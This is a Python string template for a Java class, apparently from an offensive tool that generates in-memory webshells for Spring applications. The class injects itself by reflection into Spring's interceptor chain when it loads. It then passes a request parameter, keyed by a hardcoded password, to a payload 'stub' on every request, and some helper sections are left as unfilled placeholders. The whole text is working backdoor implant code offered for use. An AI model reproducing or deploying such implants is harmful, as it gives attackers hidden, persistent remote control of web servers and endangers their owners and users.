code = """
import java.lang.reflect.*;
import java.util.*;

public class SpringInterceptor implements InvocationHandler {{
    private static String password = "{password}";
{common}
{context}
{decoder}
{stub}
    private void hook(Object request, Object response) throws Exception {{
        String payload = (String) invokeMethod(
            request, "getParameter", password
        );
        stub(payload, request, response);
    }}

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {{
        if (method.getName() == "preHandle") {{
            Object request = args[0];
            Object response = args[1];
            hook(request, response);
        }}
        return true;
    }}

    private void addInterceptor(Object proxyObject) throws Exception {{
        Class requestMappingHandlerMapping = Class.forName(
            "org.springframework.web.servlet.mvc.method.annotation"+
            ".RequestMappingHandlerMapping"
        );
        Object mapping = invokeMethod(
            getWebApplicationContext(), "getBean",
            requestMappingHandlerMapping
        );

        ArrayList adaptedInterceptors = (ArrayList) getFieldValue(
            mapping, "adaptedInterceptors"
        );
        for (Object adaptedInterceptor : adaptedInterceptors) {{
            if (adaptedInterceptor instanceof Proxy) {{
                return;
            }}
        }}
        adaptedInterceptors.add(proxyObject);
    }}

    public SpringInterceptor() {{
        synchronized(lock) {{
            Class interceptorClass = null;
            try {{
                interceptorClass = Class.forName(
                    "org.springframework.web.servlet.HandlerInterceptor"
                );
            }} catch (ClassNotFoundException e) {{}}

            if (interceptorClass != null) {{
                Object proxyObject = Proxy.newProxyInstance(
                    getLoader(),
                    new Class[]{{interceptorClass}},
                    this
                );
                try {{
                    addInterceptor(proxyObject);
                }} catch (Exception e) {{}}
            }}
        }}
    }}

    static {{
        new SpringInterceptor();
    }}
}}
"""